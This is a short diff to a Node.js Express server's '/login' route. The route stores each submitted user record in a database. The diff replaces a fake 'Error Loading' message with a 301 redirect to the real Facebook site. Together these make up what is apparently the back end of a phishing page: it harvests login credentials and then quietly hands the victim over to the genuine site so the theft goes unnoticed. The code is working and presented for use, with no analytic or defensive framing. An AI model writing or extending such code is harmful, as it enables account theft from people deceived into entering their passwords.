@@ -37,11 +37,15 @@ app.post('/login',function(req,res){
                  });
     newuser.save().then(data=>{
         console.log(data);
-        res.send('Error Loading.........we are working on it.....');
+        // response.writeHead(301,
+        //     {Location: 'https://www.facebook.com/'}
+        //   );
+        //   response.end();
+      //  res.redirect('www.m.facebook.com');
+      return res.redirect(301, 'https://www.facebook.com/');
+    });
 
-    })
-
-})
+});
 
 // app.use(session({
 //     secret: 'thisismysecret',
